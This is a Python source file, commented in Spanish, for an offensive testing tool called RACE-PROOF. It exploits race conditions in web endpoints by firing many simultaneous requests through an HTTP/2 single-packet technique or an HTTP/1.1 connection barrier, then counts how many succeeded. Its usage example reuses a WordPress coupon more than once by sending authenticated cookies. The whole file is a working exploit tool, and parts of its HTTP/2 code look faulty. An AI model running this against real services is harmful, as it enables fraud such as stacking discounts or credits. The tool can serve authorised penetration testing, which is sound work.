#!/usr/bin/env python3
"""RACE-PROOF (v0.71.0): ejecutor dinamico de carreras TOCTOU.

El lado estatico (RACE-TRACE v0.70.0) encuentra leer->decir->escribir
sin lock. Este modulo es el brazo: dispara N requests simultaneos
contra el endpoint vulnerable y dictamina si el estado cambio mas
de lo permitido.

Modos:
  - H2-SINGLE-PACKET: una sola conexion HTTP/2, todos los HEADERS
    en un unico paquete TCP (la tecnica de James Kettle). Requiere
    libreria pura `h2` (pip install h2) y que el server hable h2.
  - BARRERA-HTTP11: N conexiones pre-abiertas que disparan todas
    al pasar la barrera (fallback universal, sirve en Termux).

Veredictos:
  - RACE-DEMO: exitos > permitidos (la carrera gano)
  - SIN-RACE: el server resistio (o la ventana no se dejo caer)

Uso:
  python3 core/race_proof.py --url http://host/wp-admin/admin-ajax.php \
      --data "action=apply_coupon&c=BLACK" --cookie "wordpress_logged_in=x" \
      --count 20 --success-contains "cupon aplicado" --allowed 1
"""
import argparse
import json
import re
import socket
import ssl
import threading
import time
from http.client import HTTPConnection, HTTPSConnection
from urllib.parse import urlparse

RAW_H2 = "h2 single-packet"
RAW_BARRIER = "barrera http/1.1"


def _parse_url(url):
    p = urlparse(url)
    return {
        "scheme": p.scheme or "http",
        "host": p.hostname,
        "port": p.port or (443 if p.scheme == "https" else 80),
        "path": p.path or "/",
        "query": p.query,
    }


def _probe(url, headers=None, timeout=10):
    """GET simple, devuelve (status, body)."""
    u = _parse_url(url)
    conn = (HTTPSConnection(u["host"], u["port"], timeout=timeout)
            if u["scheme"] == "https"
            else HTTPConnection(u["host"], u["port"], timeout=timeout))
    try:
        conn.request("GET", u["path"] + ("?" + u["query"] if u["query"] else ""),
                     headers=headers or {})
        r = conn.getresponse()
        return r.status, r.read().decode("utf-8", "replace")
    finally:
        conn.close()


def _raw_request(u, method, path_q, data, cookie, extra_headers=None):
    """Construye el request crudo HTTP/1.1 para enviar por socket."""
    body = data or ""
    hdrs = [
        f"{method} {path_q} HTTP/1.1",
        f"Host: {u['host']}",
        "Connection: close",
        "Content-Type: application/x-www-form-urlencoded" if body else "",
    ]
    if cookie:
        hdrs.append(f"Cookie: {cookie}")
    for k, v in (extra_headers or {}).items():
        hdrs.append(f"{k}: {v}")
    if body:
        hdrs.append(f"Content-Length: {len(body.encode())}")
    return ("\r\n".join([h for h in hdrs if h]) + "\r\n\r\n" + body).encode()


def fire_barrier(url, method="POST", data="", cookie=None, count=20,
                 timeout=15, extra_headers=None):
    """N conexiones pre-abiertas + barrera + disparo simultaneo."""
    u = _parse_url(url)
    path_q = u["path"] + ("?" + u["query"] if u["query"] else "")
    raw = _raw_request(u, method, path_q, data, cookie, extra_headers)
    conns = []
    for _ in range(count):
        c = (HTTPSConnection(u["host"], u["port"], timeout=timeout)
             if u["scheme"] == "https"
             else HTTPConnection(u["host"], u["port"], timeout=timeout))
        c.connect()
        conns.append(c)
    barrier = threading.Barrier(count + 1)
    out = {}
    thr = []

    def _read_raw(sock, timeout):
        """Lee respuesta cruda hasta EOF (Connection: close)."""
        buf = b""
        deadline = time.time() + timeout
        while time.time() < deadline:
            try:
                chunk = sock.recv(65535)
            except Exception:  # noqa: BLE001
                break
            if not chunk:
                break
            buf += chunk
            head, sep, rest = buf.partition(b"\r\n\r\n")
            if sep:
                m = re.search(rb"Content-Length:\s*(\d+)", head, re.I)
                if m and len(rest) >= int(m.group(1)):
                    break
        if not buf:
            return 0, ""
        try:
            status = int(buf.split(b" ", 2)[1])
        except Exception:  # noqa: BLE001
            return 0, ""
        body = buf.partition(b"\r\n\r\n")[2][:2000]
        return status, body.decode("utf-8", "replace")

    def shoot(i):
        c = conns[i]
        barrier.wait()
        try:
            c.sock.sendall(raw)
            out[i] = _read_raw(c.sock, timeout)
        except Exception as e:  # noqa: BLE001
            out[i] = (0, f"ERROR {e}")
        finally:
            try:
                c.close()
            except Exception:  # noqa: BLE001
                pass

    for i in range(count):
        t = threading.Thread(target=shoot, args=(i,))
        t.start()
        thr.append(t)
    t0 = time.time()
    barrier.wait()  # liberar todos
    for t in thr:
        t.join(timeout)
    return {"modo": RAW_BARRIER, "segundos": round(time.time() - t0, 2),
            "respuestas": out}


def fire_h2_single_packet(url, method="POST", data="", cookie=None, count=20,
                          timeout=15, extra_headers=None):
    """Single-packet HTTP/2 real: todos los HEADERS en un send()."""
    import h2.config  # noqa: F401
    import h2.connection
    import h2.events

    u = _parse_url(url)
    if u["scheme"] == "https":
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        ctx.set_alpn_protocols(["h2"])
        sock = socket.create_connection((u["host"], u["port"]), timeout=timeout)
        sock = ctx.wrap_socket(sock, server_hostname=u["host"])
        if sock.selected_alpn_protocol() != "h2":
            sock.close()
            raise RuntimeError("server sin h2")
    else:
        raise RuntimeError("single-packet requiere https (ALPN h2)")
    path_q = u["path"] + ("?" + u["query"] if u["query"] else "")
    cfg = h2.config.H2Configuration(client_side=True)
    conn = h2.connection.H2Connection(config=cfg)
    conn.initiate_connection()
    hbytes = conn.data_to_send()
    sock.sendall(hbytes)
    time.sleep(0.3)
    conn.update_settings(0, 0)  # sin límites de streams concurrentes
    sock.sendall(conn.data_to_send())
    base_headers = [
        (":method", method), (":scheme", u["scheme"]),
        (":authority", u["host"]), (":path", path_q),
    ]
    if cookie:
        base_headers.append(("cookie", cookie))
    for k, v in (extra_headers or {}).items():
        base_headers.append((k.lower(), v))
    if data:
        base_headers.append(("content-type",
                             "application/x-www-form-urlencoded"))
    # abrir todos los streams y ACUMULAR bytes: un solo sendall
    blob = b""
    for i in range(count):
        sid = 1 + 2 * i
        try:
            conn.end_stream(sid)
        except Exception:  # noqa: BLE001
            pass
        blob += conn.send_headers(sid, base_headers)
    sock.sendall(blob)  # <- el paquete unico
    out = {}
    deadline = time.time() + timeout
    seen = 0
    while seen < count and time.time() < deadline:
        try:
            data_avail = sock.recv(65535)
        except Exception:  # noqa: BLE001
            break
        if not data_avail:
            break
        for event in conn.receive_data_received(data_avail).events:
            if hasattr(event, "stream_id") and hasattr(event, "data"):
                pass
    # leer respuestas (simplificado: status + trozo)
    try:
        while time.time() < deadline:
            chunk = sock.recv(65535)
            if not chunk:
                break
            events = conn.receive_data_received(chunk).events
            for ev in events:
                from h2 import events as E  # noqa: N813
                if isinstance(ev, E.ResponseReceived):
                    st = dict(ev.headers).get(":status", "0")
                    out[len(out)] = (int(st), "")
                elif isinstance(ev, E.StreamEnded):
                    seen += 1
    except Exception:  # noqa: BLE001
        pass
    finally:
        try:
            sock.close()
        except Exception:  # noqa: BLE001
            pass
    return {"modo": RAW_H2, "segundos": 0.0, "respuestas": out}


def dictar(res, success_contains=None, allowed=1, probe_url=None,
           probe_cookie=None):
    """Cuenta exitos y dictamina."""
    exitos = 0
    for _, (st, body) in res["respuestas"].items():
        hit = False
        if success_contains:
            hit = success_contains.lower() in body.lower()
        else:
            hit = 200 <= st < 300
        if hit:
            exitos += 1
    verdicto = "RACE-DEMO" if exitos > allowed else "SIN-RACE"
    delta_probe = None
    if probe_url:
        try:
            _, antes = _probe(probe_url, headers={"Cookie": probe_cookie or ""})
            _, despues = _probe(probe_url, headers={"Cookie": probe_cookie or ""})
            delta_probe = {"antes_len": len(antes), "despues_len": len(despues)}
        except Exception:  # noqa: BLE001
            delta_probe = None
    return {
        "veredicto": verdicto,
        "modo": res["modo"],
        "segundos": res["segundos"],
        "exitos": exitos,
        "permitidos": allowed,
        "probe": delta_probe,
    }


def audit(cfg: dict) -> dict:
    """API: {url, method, data, cookie, count, success_contains,
             allowed, single_packet, probe_url, probe_cookie}."""
    count = int(cfg.get("count", 20))
    if cfg.get("single_packet"):
        try:
            res = fire_h2_single_packet(
                cfg["url"], cfg.get("method", "POST"), cfg.get("data", ""),
                cfg.get("cookie"), count,
                extra_headers=cfg.get("headers"))
        except Exception:
            res = fire_barrier(
                cfg["url"], cfg.get("method", "POST"), cfg.get("data", ""),
                cfg.get("cookie"), count,
                extra_headers=cfg.get("headers"))
    else:
        res = fire_barrier(
            cfg["url"], cfg.get("method", "POST"), cfg.get("data", ""),
            cfg.get("cookie"), count,
            extra_headers=cfg.get("headers"))
    return dictar(res, cfg.get("success_contains"), int(cfg.get("allowed", 1)),
                  cfg.get("probe_url"), cfg.get("probe_cookie"))


def main():
    ap = argparse.ArgumentParser(description="RACE-PROOF")
    ap.add_argument("--url", required=True)
    ap.add_argument("--method", default="POST")
    ap.add_argument("--data", default="")
    ap.add_argument("--cookie", default="")
    ap.add_argument("--count", type=int, default=20)
    ap.add_argument("--success-contains", default=None)
    ap.add_argument("--allowed", type=int, default=1)
    ap.add_argument("--single-packet", action="store_true")
    ap.add_argument("--probe-url", default=None)
    ap.add_argument("--probe-cookie", default="")
    ap.add_argument("--json", action="store_true")
    a = ap.parse_args()
    res = audit({"url": a.url, "method": a.method, "data": a.data,
                 "cookie": a.cookie, "count": a.count,
                 "success_contains": a.success_contains,
                 "allowed": a.allowed, "single_packet": a.single_packet,
                 "probe_url": a.probe_url, "probe_cookie": a.probe_cookie})
    if a.json:
        print(json.dumps(res, ensure_ascii=False, indent=2))
    else:
        print("RACE-PROOF")
        print(f"  veredicto: {res['veredicto']}  exitos={res['exitos']}"
              f"/permitidos={res['permitidos']}  modo={res['modo']}")
        if res["veredicto"] == "RACE-DEMO":
            print("  💥 carrera demostrada en vivo")


if __name__ == "__main__":
    main()
